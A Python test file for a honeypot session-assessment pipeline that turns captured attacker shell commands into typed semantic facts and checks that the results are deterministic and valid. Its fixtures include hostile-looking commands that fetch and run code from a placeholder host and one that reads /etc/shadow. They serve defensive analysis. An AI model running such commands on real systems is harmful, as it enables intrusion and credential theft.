from __future__ import annotations

import copy
from pathlib import Path

import pytest

import production.reporting.session_assessment_v4 as assessment_module
from production.reporting.session_assessment_v4 import (
    build_session_assessment_v4,
    validate_session_assessment_v4,
)
from production.reporting.threat_hypothesis import build_observed_behavior
from production.reporting.typed_semantic_facts import (
    build_typed_semantic_fact_set,
    run_typed_semantic_shadow,
    validate_typed_semantic_fact_set,
)


ROOT = Path(__file__).resolve().parents[1]
BEHAVIOR_POLICY = "configs/threat_hypothesis_behavior.trusted.json"
CLASSIFICATION_POLICY = "configs/classification_rules.trusted.json"


def _payload(
    commands: list[str],
    *,
    session_id: str = "typed-semantic-shadow",
    event_overrides: list[dict] | None = None,
    classification_events: list[dict] | None = None,
) -> dict:
    events = []
    for index, command in enumerate(commands):
        event = {
            "session": session_id,
            "src_ip": "192.0.2.120",
            "timestamp": f"2026-07-29T14:00:{index:02d}Z",
            "eventid": "cowrie.command.input",
            "input": command,
            "success": 1,
        }
        if event_overrides:
            event.update(event_overrides[index])
        events.append(event)
    return {
        "session_id": session_id,
        "src_ip": "192.0.2.120",
        "commands": commands,
        "commands_success": commands,
        "commands_failed": [],
        "classification_events": classification_events or [],
        "raw_events": events,
    }


def _observed(payload: dict) -> dict:
    return build_observed_behavior(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
    )


def _fact_for_command(fact_set: dict, command: str) -> dict:
    return next(
        fact
        for fact in fact_set["facts"]
        if fact.get("shell_context", {}).get("command") == command
    )


def _without_runtime_timestamp(report: dict) -> dict:
    result = copy.deepcopy(report)
    result.pop("generated_at", None)
    (result.get("response_guidance_v3") or {}).pop("generated_at", None)
    return result


def test_typed_fact_set_is_deterministic_valid_and_does_not_mutate_observed() -> None:
    payload = _payload(
        [
            "curl https://example.invalid/tool -o /var/tmp/tool",
            "chmod 700 /var/tmp/tool",
            "sh /var/tmp/tool",
        ],
        session_id="typed-determinism",
    )
    observed = _observed(payload)
    original = copy.deepcopy(observed)

    first = build_typed_semantic_fact_set(observed)
    second = build_typed_semantic_fact_set(observed)

    assert first == second
    assert first["fact_set_sha256"] == second["fact_set_sha256"]
    assert first["shadow_comparison"]["status"] == "exact_reference_match"
    assert validate_typed_semantic_fact_set(first) == []
    assert observed == original
    assert first["authority"] == {
        "authoritative": False,
        "may_select_findings": False,
        "may_select_hypotheses": False,
        "may_select_guidance": False,
        "may_change_canonical_ids": False,
    }


def test_structured_entities_outcomes_and_exact_evidence_refs_are_preserved() -> None:
    command = "chmod 640 ./captured.bin"
    payload = _payload(
        [command],
        session_id="typed-structured-values",
        event_overrides=[{"cwd": "/srv/cowrie"}],
    )
    observed = _observed(payload)
    fact_set = build_typed_semantic_fact_set(observed)
    fact = _fact_for_command(fact_set, command)
    entity = fact["entities"]["modified_paths"][0]

    assert isinstance(entity, dict)
    assert entity["original_value"] == "./captured.bin"
    assert entity["normalized_value"] == "/srv/cowrie/captured.bin"
    assert entity["uncertain"] is False
    assert entity["linkable"] is True
    assert fact["operation"]["operation_type"] == (
        "permission_modification_attempt"
    )
    assert fact["operation_status"] == "reported_success"
    assert fact["command_outcome"] == "cowrie_reported_success"
    assert fact["working_directory_context"] == {
        "observed": "/srv/cowrie",
        "effective": "/srv/cowrie",
        "status": "observed",
        "directory_change": {},
    }
    assert fact["path_resolutions"][0]["resolution_status"] == (
        "recorded_resolved"
    )
    assert fact["source_observation_ref"] in fact["supporting_evidence_refs"]
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_conditional_directory_change_preserves_path_uncertainty() -> None:
    command = (
        "cd /var/tmp && curl https://example.invalid/agent -o staged-agent"
    )
    payload = _payload([command], session_id="typed-conditional-directory")
    fact_set = build_typed_semantic_fact_set(_observed(payload))
    cd_fact = _fact_for_command(fact_set, "cd /var/tmp")
    transfer_fact = _fact_for_command(
        fact_set,
        "curl https://example.invalid/agent -o staged-agent",
    )
    destination = transfer_fact["entities"]["destination_paths"][0]
    resolution = transfer_fact["path_resolutions"][0]

    assert cd_fact["operation"]["operation_type"] == (
        "working_directory_change"
    )
    assert cd_fact["working_directory_context"]["directory_change"] == {
        "original_target": "/var/tmp",
        "resolved_target": "/var/tmp",
        "status": "conditional_candidate",
    }
    assert transfer_fact["working_directory_context"]["effective"] == "/var/tmp"
    assert transfer_fact["working_directory_context"]["status"] == (
        "conditional_candidate"
    )
    assert destination["uncertain"] is True
    assert destination["linkable"] is False
    assert resolution["resolution_status"] == "conditional_candidate"
    assert resolution["candidate_normalized_value"] == "/var/tmp/staged-agent"
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_unresolved_path_without_working_directory_remains_unresolved() -> None:
    command = "wget https://example.invalid/dropper -O local-dropper"
    fact_set = build_typed_semantic_fact_set(
        _observed(_payload([command], session_id="typed-unresolved-path"))
    )
    fact = _fact_for_command(fact_set, command)
    entity = fact["entities"]["destination_paths"][0]
    resolution = fact["path_resolutions"][0]

    assert entity["normalized_value"] == "relative:local-dropper"
    assert entity["uncertain"] is True
    assert entity["linkable"] is False
    assert resolution["resolution_status"] == "unresolved"
    assert resolution["candidate_normalized_value"] == ""
    assert fact_set["shadow_comparison"]["unresolved_path_count"] == 1


def test_relationship_chain_and_entity_references_resolve_exactly() -> None:
    payload = _payload(
        [
            "curl https://example.invalid/payload -o /tmp/payload",
            "chmod 700 /tmp/payload",
            "sh /tmp/payload",
        ],
        session_id="typed-reference-resolution",
    )
    observed = _observed(payload)
    fact_set = build_typed_semantic_fact_set(observed)
    fact_ids = {fact["fact_id"] for fact in fact_set["facts"]}
    relationship_ids = {
        relationship["relationship_id"]
        for relationship in fact_set["relationships"]
    }
    entity_ids = {entity["entity_id"] for entity in fact_set["entities"]}

    assert relationship_ids == {
        relationship["relationship_id"]
        for relationship in observed["behavior_relationships"]
    }
    assert {chain["chain_id"] for chain in fact_set["chains"]} == {
        chain["chain_id"] for chain in observed["connected_behavior_chains"]
    }
    assert all(
        relationship["source_fact_id"] in fact_ids
        and relationship["target_fact_id"] in fact_ids
        and (
            not relationship["entity_ref"]
            or relationship["entity_ref"] in entity_ids
        )
        for relationship in fact_set["relationships"]
    )
    assert all(
        set(chain["fact_ids"]) <= fact_ids
        and set(chain["relationship_ids"]) <= relationship_ids
        and set(chain["entity_refs"]) <= entity_ids
        for chain in fact_set["chains"]
    )
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_unknown_command_remains_unknown_despite_trusted_attck_candidate() -> None:
    command = "frobnicate --quiet target"
    classification = [
        {
            "command": command,
            "original_command": command,
            "ttp": "T1059",
            "tactic": "execution",
            "source": "rule",
            "high_confidence": True,
            "evidence_id": "typed-unknown-classification",
            "event_timestamp": "2026-07-29T14:00:00Z",
            "cowrie_eventid": "cowrie.command.input",
        }
    ]
    fact_set = build_typed_semantic_fact_set(
        _observed(
            _payload(
                [command],
                session_id="typed-unknown-command",
                classification_events=classification,
            )
        )
    )
    fact = _fact_for_command(fact_set, command)

    assert fact["operation"] == {
        "operation_type": "unknown",
        "operation_class": "unknown",
        "resolution": "unresolved",
        "literal_operation_types": [],
    }
    assert fact["trusted_attck_candidates"][0]["ttp"] == "T1059"
    assert fact_set["shadow_comparison"]["unknown_operation_count"] == 1
    assert validate_typed_semantic_fact_set(fact_set) == []


@pytest.mark.parametrize(
    ("command", "operation_type", "operation_class"),
    [
        ("crontab -l", "schedule_inspection", "read"),
        ("crontab /tmp/reviewed.tab", "schedule_modification", "modify"),
        ("systemctl status sshd", "service_inspection", "read"),
        ("systemctl restart sshd", "service_modification", "modify"),
    ],
)
def test_read_and_modify_semantics_remain_distinct(
    command: str,
    operation_type: str,
    operation_class: str,
) -> None:
    fact_set = build_typed_semantic_fact_set(
        _observed(
            _payload(
                [command],
                session_id=f"typed-read-modify-{operation_type}",
            )
        )
    )
    operation = _fact_for_command(fact_set, command)["operation"]

    assert operation["operation_type"] == operation_type
    assert operation["operation_class"] == operation_class
    assert operation["resolution"] == "literal_command_semantics"


def test_validator_rejects_unstructured_entities_and_unresolved_references() -> None:
    payload = _payload(
        [
            "curl https://example.invalid/a -o /tmp/a",
            "sh /tmp/a",
        ],
        session_id="typed-strict-validation",
    )
    fact_set = build_typed_semantic_fact_set(_observed(payload))
    forged = copy.deepcopy(fact_set)
    forged["facts"][0]["entities"]["destination_paths"] = ["not-structured"]
    forged["relationships"][0]["target_fact_id"] = "missing-fact"

    errors = validate_typed_semantic_fact_set(forged)

    assert "fact_set_sha256 mismatch" in errors
    assert any("must remain structured" in error for error in errors)
    assert any("unresolved fact references" in error for error in errors)


def test_shadow_runtime_is_discarded_and_cannot_change_v4_v3_outputs(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = _payload(
        ["cat /etc/shadow"],
        session_id="typed-shadow-output-isolation",
    )
    baseline = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )
    calls = []

    def alternate_shadow(observed: dict) -> dict:
        calls.append(observed["session_id"])
        return {
            "status": "valid",
            "fact_set_sha256": "f" * 64,
            "comparison": {"status": "deliberately-different-shadow"},
        }

    monkeypatch.setattr(
        assessment_module,
        "run_typed_semantic_shadow",
        alternate_shadow,
    )
    alternate = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    def unavailable_shadow(_: dict) -> dict:
        raise RuntimeError("shadow-only controlled failure")

    monkeypatch.setattr(
        assessment_module,
        "run_typed_semantic_shadow",
        unavailable_shadow,
    )
    unavailable = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    assert calls == [payload["session_id"]]
    assert _without_runtime_timestamp(baseline) == _without_runtime_timestamp(
        alternate
    )
    assert _without_runtime_timestamp(baseline) == _without_runtime_timestamp(
        unavailable
    )
    assert baseline["assessment_id"] == alternate["assessment_id"]
    assert baseline["assessment_id"] == unavailable["assessment_id"]
    assert baseline["response_guidance_v3"]["guidance_id"] == (
        alternate["response_guidance_v3"]["guidance_id"]
    )
    assert baseline["response_guidance_v3"]["findings"] == (
        alternate["response_guidance_v3"]["findings"]
    )
    assert baseline["response_guidance_v3"]["advisory_actions"] == (
        alternate["response_guidance_v3"]["advisory_actions"]
    )
    assert "typed_semantic" not in str(baseline)
    assert validate_session_assessment_v4(baseline) == []


def test_shadow_summary_exposes_comparison_only_to_direct_caller() -> None:
    payload = _payload(
        ["mystery-tool --inspect"],
        session_id="typed-shadow-summary",
    )
    result = run_typed_semantic_shadow(_observed(payload))

    assert result["status"] == "valid"
    assert result["authoritative"] is False
    assert result["persistence"] == "discarded"
    assert result["comparison"]["status"] == "exact_reference_match"
    assert result["comparison"]["unknown_operation_count"] == 1
    assert "facts" not in result
